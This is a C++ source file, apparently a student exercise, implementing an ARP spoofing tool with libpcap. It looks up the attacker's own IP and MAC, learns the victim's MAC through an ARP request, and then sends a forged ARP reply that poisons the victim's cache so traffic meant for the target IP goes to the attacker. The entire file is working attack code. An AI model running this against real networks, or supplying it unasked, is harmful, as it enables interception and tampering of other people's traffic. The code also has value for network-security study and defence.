#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
/*Adding header due to mac address*/
/*https://tttsss77.tistory.com/138*/
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define MAC_LENGTH 6
//my code.
#define SUCCESS 0
#define FAIL -1

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

using namespace std;

int MyComputerMacIpAddress(char* device, uint8_t* buffer, int flag)
{
	struct ifreq ifr;
	int sockfd, ret;

	/*open the network socket*/
	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if(sockfd<0){
		printf("Fail to get interface MAC address - socket() failed - %m\n");
		return -1;
	}

	/*check MAC address of network interface*/
	strncpy(ifr.ifr_name, device, IFNAMSIZ);

	if(flag==0){
		printf("Get interface(%s) IP address\n", device);
		if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) printf("Error");
		else inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, (char*)buffer,sizeof(struct sockaddr));
	}
	else if(flag==1){
		printf("Get interface(%s) MAC address\n", device);
		ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
		if(ret<0){
			printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
			close(sockfd);
			return -1;
		}
		memcpy(buffer, ifr.ifr_hwaddr.sa_data, MAC_LENGTH);
	} 

	/*close the network interface socket*/
	close(sockfd);
	return 0;
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	uint8_t mac_addr[MAC_LENGTH];
	char ip_addr[40];
	char attacker_mac[18];
	EthArpPacket packet;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	int flag;
	//0. fifure out to my(attacker) ip address
	flag = 0;
	int check1 = MyComputerMacIpAddress(dev, (uint8_t*) ip_addr, flag);
	if(check1==FAIL){
		return -1; //In fuction, error message already print.
	}
	printf("%s\n",ip_addr);

	//1. figure out to my(attacker) mac address
	flag = 1;
	int check2 = MyComputerMacIpAddress(dev, mac_addr, flag);
	if(check2==FAIL){
		return -1; //In fuction, error message already print.
	}
	sprintf(attacker_mac,"%02x:%02x:%02x:%02x:%02x:%02x",mac_addr[0],mac_addr[1],mac_addr[2],mac_addr[3],mac_addr[4],mac_addr[5]); //change mac format to array
	printf("%s\n",attacker_mac);
	//2-1. figure out to victim's mac address
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); //broadcast
	packet.eth_.smac_ = Mac(attacker_mac); //source mac is my mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(attacker_mac); //source mac is my mac
	packet.arp_.sip_ = htonl(Ip(ip_addr)); //my Ip
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //First, I don't know victim mac 
	packet.arp_.tip_ = htonl(Ip(argv[2])); // We know victim's ip throughout parameter
	int res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res1 != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(handle));
	}
	//2-2. figure out to victim's mac address
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	Mac victim_mac;
	while(true){
		struct pcap_pkthdr* header;
		const u_char* replypacket;
		int res2 = pcap_next_ex(pcap, &header, &replypacket);
		if (res2 == 0) continue;
		if (res2 == PCAP_ERROR || res2 == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res2, pcap_geterr(pcap));
			break;
		}
		PEthHdr eth_hdr = (PEthHdr)replypacket;
		PArpHdr arp_hdr = (PArpHdr)((char*)replypacket+sizeof(EthHdr));
		if((memcmp(mac_addr, eth_hdr->dmac().operator uint8_t *(), MAC_LENGTH)==0)&&(eth_hdr->type()==EthHdr::Arp)){ //dst mac && check Arp
			if(arp_hdr->sip().operator uint32_t()==Ip(argv[2]).operator uint32_t()){ //find reply packet throughout ip
				victim_mac = arp_hdr->smac();
				break;
			}
		}
	}
	//3. infection to Victim's packet
	packet.eth_.dmac_ = Mac(victim_mac);
	packet.eth_.smac_ = Mac(mac_addr);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(mac_addr);
	packet.arp_.sip_ = htonl(Ip(argv[3]));
	packet.arp_.tmac_ = Mac(mac_addr);
	packet.arp_.tip_ = htonl(Ip(argv[2]));

	int res3 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res3 != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res3, pcap_geterr(handle));
	}

	pcap_close(handle);
}
